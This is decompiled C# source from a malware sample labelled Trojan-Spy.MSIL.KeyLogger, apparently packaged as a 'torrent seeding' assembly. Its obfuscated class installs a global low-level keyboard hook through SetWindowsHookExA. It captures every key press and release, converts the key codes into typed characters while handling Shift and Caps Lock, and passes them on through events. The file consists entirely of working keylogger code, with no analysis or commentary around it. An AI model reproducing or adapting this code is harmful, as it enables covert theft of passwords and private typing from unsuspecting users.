// Decompiled with JetBrains decompiler
// Type: jBcGFYzTOTtD
// Assembly: torrent seeding, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 198D2D35-528E-4E59-8C51-F602B2216010
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan-Spy.MSIL.KeyLogger.aww-b6028ae8a60c144786a34898929ec8bbcd3b3a28f9ca522a06487a921e0c2ded.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class jBcGFYzTOTtD
{
  private static int rDNwOVixQZpD;
  private static jBcGFYzTOTtD.xoHdskvHibDT phJSglASvYaV;

  [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int tokbvSrZfrJe(
    int iPgDsdQUYuVx,
    jBcGFYzTOTtD.xoHdskvHibDT lrZQcCfRrFnE,
    int JhtUQLlIpXzF,
    int pQeJDjvWwOBy);

  [DllImport("user32", EntryPoint = "CallNextHookEx", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int JrBNLLapBLZi(
    int iPgDsdQUYuVx,
    int ogekZfLDyFFs,
    int uUtUnVajYfjy,
    ref jBcGFYzTOTtD.dtGFkvNLQDlo wVHvnnScKxxf);

  [DllImport("user32", EntryPoint = "UnhookWindowsHookEx", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int XWGUlBzjdJZu(int iPgDsdQUYuVx);

  public static event jBcGFYzTOTtD.XUZJkEDoGvEtEventHandler XUZJkEDoGvEt;

  public static event jBcGFYzTOTtD.OdrXQPtwVsZbEventHandler OdrXQPtwVsZb;

  public void OhAHcyUuPjyI()
  {
    jBcGFYzTOTtD.phJSglASvYaV = new jBcGFYzTOTtD.xoHdskvHibDT(this.ETDCsoKFkSJx);
    jBcGFYzTOTtD.rDNwOVixQZpD = jBcGFYzTOTtD.tokbvSrZfrJe(13, jBcGFYzTOTtD.phJSglASvYaV, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
  }

  private int ETDCsoKFkSJx(
    int gwkYxIHKarfs,
    int uUtUnVajYfjy,
    ref jBcGFYzTOTtD.dtGFkvNLQDlo wVHvnnScKxxf)
  {
    if (gwkYxIHKarfs == 0)
    {
      switch (uUtUnVajYfjy)
      {
        case 256:
        case 260:
          jBcGFYzTOTtD.XUZJkEDoGvEtEventHandler xuzJkEdoGvEtEvent = jBcGFYzTOTtD.XUZJkEDoGvEtEvent;
          if (xuzJkEdoGvEtEvent != null)
          {
            xuzJkEdoGvEtEvent(this.TzWmTJkgAgpp((Keys) wVHvnnScKxxf.gwkYxIHKarfs));
            break;
          }
          break;
        case 257:
        case 261:
          jBcGFYzTOTtD.OdrXQPtwVsZbEventHandler odrXqPtwVsZbEvent = jBcGFYzTOTtD.OdrXQPtwVsZbEvent;
          if (odrXqPtwVsZbEvent != null)
          {
            odrXqPtwVsZbEvent(this.TzWmTJkgAgpp((Keys) wVHvnnScKxxf.gwkYxIHKarfs));
            break;
          }
          break;
      }
    }
    return jBcGFYzTOTtD.JrBNLLapBLZi(jBcGFYzTOTtD.rDNwOVixQZpD, gwkYxIHKarfs, uUtUnVajYfjy, ref wVHvnnScKxxf);
  }

  public void fpWBcjPdLkrV()
  {
    jBcGFYzTOTtD.XWGUlBzjdJZu(jBcGFYzTOTtD.rDNwOVixQZpD);
    // ISSUE: explicit finalizer call
    this.Finalize();
  }

  private string TzWmTJkgAgpp(Keys gPNxznKgAJni)
  {
    Keys keys = gPNxznKgAJni;
    if (keys >= Keys.A && keys <= Keys.Z)
      return Control.IsKeyLocked(Keys.Capital) | (Control.ModifierKeys & Keys.Shift) != Keys.None ? gPNxznKgAJni.ToString() : gPNxznKgAJni.ToString().ToLower();
    if (keys >= Keys.D0 && keys <= Keys.D9)
    {
      if ((Control.ModifierKeys & Keys.Shift) == Keys.None)
        return gPNxznKgAJni.ToString().Replace("D", (string) null);
      string Left = gPNxznKgAJni.ToString();
      if (Operators.CompareString(Left, "D1", false) == 0)
        return "!";
      if (Operators.CompareString(Left, "D2", false) == 0)
        return "@";
      if (Operators.CompareString(Left, "D3", false) == 0)
        return "#";
      if (Operators.CompareString(Left, "D4", false) == 0)
        return "$";
      if (Operators.CompareString(Left, "D5", false) == 0)
        return "%";
      if (Operators.CompareString(Left, "D6", false) == 0)
        return "^";
      if (Operators.CompareString(Left, "D7", false) == 0)
        return "&";
      if (Operators.CompareString(Left, "D8", false) == 0)
        return "*";
      if (Operators.CompareString(Left, "D9", false) == 0)
        return "(";
      if (Operators.CompareString(Left, "D0", false) == 0)
        return ")";
    }
    else
    {
      if (keys >= Keys.NumPad0 && keys <= Keys.NumPad9)
        return gPNxznKgAJni.ToString().Replace("NumPad", (string) null);
      if (keys >= Keys.Multiply && keys <= Keys.Divide)
      {
        string Left = gPNxznKgAJni.ToString();
        if (Operators.CompareString(Left, "Divide", false) == 0)
          return "/";
        if (Operators.CompareString(Left, "Multiply", false) == 0)
          return "*";
        if (Operators.CompareString(Left, "Subtract", false) == 0)
          return "-";
        if (Operators.CompareString(Left, "Add", false) == 0)
          return "+";
        if (Operators.CompareString(Left, "Decimal", false) == 0)
          return ".";
      }
      else
      {
        if (keys == Keys.Space)
          return " ";
        if (keys >= Keys.OemSemicolon && keys <= Keys.OemQuotes)
        {
          if ((Control.ModifierKeys & Keys.Shift) != Keys.None)
          {
            string Left = gPNxznKgAJni.ToString();
            if (Operators.CompareString(Left, "OemMinus", false) == 0)
              return "_";
            if (Operators.CompareString(Left, "Oemplus", false) == 0)
              return "+";
            if (Operators.CompareString(Left, "OemOpenBrackets", false) == 0)
              return "{";
            if (Operators.CompareString(Left, "Oem6", false) == 0)
              return "}";
            if (Operators.CompareString(Left, "Oem5", false) == 0)
              return "|";
            if (Operators.CompareString(Left, "Oem1", false) == 0)
              return ":";
            if (Operators.CompareString(Left, "Oem7", false) == 0)
              return "\"";
            if (Operators.CompareString(Left, "Oemcomma", false) == 0)
              return "<";
            if (Operators.CompareString(Left, "OemPeriod", false) == 0)
              return ">";
            if (Operators.CompareString(Left, "OemQuestion", false) == 0)
              return "?";
            if (Operators.CompareString(Left, "Oemtilde", false) == 0)
              return "~";
          }
          else
          {
            string Left = gPNxznKgAJni.ToString();
            if (Operators.CompareString(Left, "OemMinus", false) == 0)
              return "-";
            if (Operators.CompareString(Left, "Oemplus", false) == 0)
              return "=";
            if (Operators.CompareString(Left, "OemOpenBrackets", false) == 0)
              return "[";
            if (Operators.CompareString(Left, "Oem6", false) == 0)
              return "]";
            if (Operators.CompareString(Left, "Oem5", false) == 0)
              return "\\";
            if (Operators.CompareString(Left, "Oem1", false) == 0)
              return ";";
            if (Operators.CompareString(Left, "Oem7", false) == 0)
              return "'";
            if (Operators.CompareString(Left, "Oemcomma", false) == 0)
              return ",";
            if (Operators.CompareString(Left, "OemPeriod", false) == 0)
              return ".";
            if (Operators.CompareString(Left, "OemQuestion", false) == 0)
              return "/";
            if (Operators.CompareString(Left, "Oemtilde", false) == 0)
              return "`";
          }
        }
        else
          return keys == Keys.Return ? Environment.NewLine : "<" + gPNxznKgAJni.ToString() + ">";
      }
    }
    return (string) null;
  }

  private delegate int xoHdskvHibDT(
    int ogekZfLDyFFs,
    int uUtUnVajYfjy,
    ref jBcGFYzTOTtD.dtGFkvNLQDlo wVHvnnScKxxf);

  public delegate void XUZJkEDoGvEtEventHandler(string rDNwOVixQZpD);

  public delegate void OdrXQPtwVsZbEventHandler(string rDNwOVixQZpD);

  private struct dtGFkvNLQDlo
  {
    public int gwkYxIHKarfs;
    public int BaOXggJJxoTi;
    public int gSPnRdwgVrSy;
    public int KgXrYQAbDDtT;
    public int QGvBoPLHQNSp;
  }
}
